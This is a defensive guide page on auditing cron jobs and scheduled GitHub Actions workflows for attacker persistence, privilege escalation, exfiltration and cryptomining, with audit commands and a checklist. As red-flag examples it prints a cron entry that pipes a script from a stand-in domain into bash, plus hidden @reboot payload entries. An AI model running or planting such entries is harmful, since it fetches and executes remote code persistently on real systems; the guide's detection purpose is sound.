# Cron & Automation

You set it up, it runs, you moved on. That's how most cron jobs work in practice — configured once, never looked at again. That's also exactly what makes them one of the most valuable targets on your system.

If you're setting up cron for the first time, start with [Cron & Scheduled Tasks](../code/cron.md) in Writing Secure Code. This section is about what happens after — auditing what's running, understanding how attackers use scheduled tasks, and keeping your automation from becoming a liability over time.

---

## Why Cron Is a Juicy Target

If you've ever done a CTF, you know the move: get a foothold, run `crontab -l`, check `/etc/cron*`, and look for anything running as root or pulling from a writable path. Nine times out of ten, that's your privilege escalation. That's not a CTF trick — that's a real attack pattern. Cron jobs are one of the first things an attacker checks because they're one of the last things a developer thinks about after setup.

Once an attacker has planted something in your cron table or your scheduled workflow, removing the original malware isn't enough. The cron job reinstalls it. Every time. On every reboot. This is why incident response always includes auditing scheduled tasks — it's not just cleanup, it's where the backdoor lives.

A rootkit that survives a reboot, a keylogger that starts on login, a reverse shell that phones home every five minutes, a cryptominer running silently on GitHub's infrastructure — all of these use cron and scheduled tasks as their persistence mechanism. The malware is the payload. Cron is what keeps it alive.

---

## What Attackers Actually Do With Them

**Persistence.** Plant a cron job that re-establishes access on a schedule. You find the malware, remove it, think you're clean. The cron job runs at midnight and reinstalls it. This repeats until someone audits the crontab.

**Privilege escalation.** A script that runs as root and reads from a path the attacker can write to is an escalation vector. The attacker modifies the script or the file it reads, waits for the next scheduled run, and their code executes as root.

**Data exfiltration on a schedule.** A cron job that quietly copies files, dumps database contents, or sends environment variables to an external endpoint — running every hour, generating no alerts, blending into normal automation traffic.

**Cryptomining.** One of the most common payloads in compromised CI/CD environments. A scheduled GitHub Actions workflow mining cryptocurrency on GitHub's infrastructure. Your repo looks normal. Your Actions minutes disappear.

**Keylogging and credential harvesting.** On a compromised local machine, a cron job that starts a keylogger on login or periodically dumps shell history and sends it out. Automated, silent, persistent.

---

## How to Audit What's Running

Run this regularly — not just when something feels wrong.

=== "macOS / Linux / Kali"
    ```bash
    # View your user crontab
    crontab -l

    # View system-wide cron jobs
    cat /etc/crontab
    ls -la /etc/cron.d/
    ls -la /etc/cron.daily/
    ls -la /etc/cron.weekly/
    ls -la /etc/cron.monthly/

    # Check for cron jobs running as root
    sudo crontab -l
    ```

    A normal, expected crontab entry looks like this:
    ```
    0 9 * * * /usr/bin/python3 /home/youruser/project/scripts/backup.py >> /home/youruser/logs/backup.log 2>&1
    ```

    An entry that should raise a flag looks like this:
    ```
    */5 * * * * curl https://suspicious-domain.com/script.sh | bash
    * * * * * /tmp/update.sh
    @reboot /home/youruser/.hidden/payload.sh
    ```
    
    Red flags to watch for: entries that pull from external URLs, scripts living in `/tmp` or hidden directories, entries using `@reboot` that you didn't create, or anything you simply don't recognize.

=== "Windows (WSL2)"
    ```bash
    # Inside WSL2
    crontab -l

    # Windows Task Scheduler — run in PowerShell outside WSL2
    Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}

    # More detail on a specific task
    Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo
    ```

For every entry — yours and any system entries — ask:

- Do I know what this does?
- Do I know why it exists?
- Do I know what credentials it uses and where they're stored?
- Do I know what user it runs as?
- Is the script it calls in a location only I can write to?

If you can't answer all five, investigate before moving on.

---

## Signs Something Has Been Tampered With

- A cron entry you don't recognize
- A script that's been modified more recently than you last touched it — check with `ls -la`
- Output in your logs that doesn't match what the script should be doing
- Unexpected network connections timed to your cron schedule — check with `netstat` or `ss`
- Cron jobs running as root that you didn't configure
- Actions minutes being consumed faster than your scheduled workflows should account for

```bash
# Check when a script was last modified
ls -la /home/youruser/scripts/backup.py

# Check for unexpected network connections
# You're looking for connections timed to your cron schedule that you didn't expect
# Columns show: protocol, local address, remote address, process
ss -tulnp
netstat -tulnp

# Check recent cron activity in system logs
grep CRON /var/log/syslog | tail -50        # Linux
grep cron /var/log/system.log | tail -50    # macOS
```

When reviewing `ss` or `netstat` output, look for outbound connections to IP addresses or domains you don't recognize — especially ones that appear right after a scheduled job runs. A cron job that's been tampered with to exfiltrate data will show up here as an unexpected connection timed to its schedule.

---

## GitHub Actions Scheduled Workflows — Ongoing Review

A scheduled workflow that was clean when you wrote it may not be clean if an Action it uses has been compromised since. Review regularly:

```bash
# Find Actions pinned to tags instead of SHAs — these can change silently
grep -r "uses:" .github/workflows/ | grep -v "@[a-f0-9]\{40\}"
```

Any result that shows a tag (`@v2`, `@main`, `@latest`) instead of a 40-character SHA is a mutable reference. Pin it. See [Advanced Security](../hardening/advanced-security.md).

Also review what secrets your scheduled workflows have access to. If the workflow scope has grown since you set it up, trim it back to minimum required.

---

## Cron Maintenance Checklist

```
□ User crontab audited — every entry accounted for
□ System cron directories checked — no unrecognized entries
□ Root crontab reviewed
□ Script files checked for unexpected modifications
□ Log output reviewed — nothing unexpected
□ Network connections checked against expected cron activity
□ GitHub Actions scheduled workflows reviewed
□ All Actions in scheduled workflows pinned to SHAs
□ Scheduled workflow secrets scoped to minimum required
□ Windows Task Scheduler audited if applicable
```

---

## Where This Goes Next

Your scheduled tasks are audited and clean. The last two sections cover the ongoing intelligence layer — monitoring your dependencies after they're installed and keeping your notifications from becoming a security surface.

[→ Dependency Intelligence](dependencies.md) — Ongoing monitoring of your dependencies after installation, not just at setup.

---

*[@sudochef](https://instagram.com/sudochef) — Build like you're the target. Because you are.*
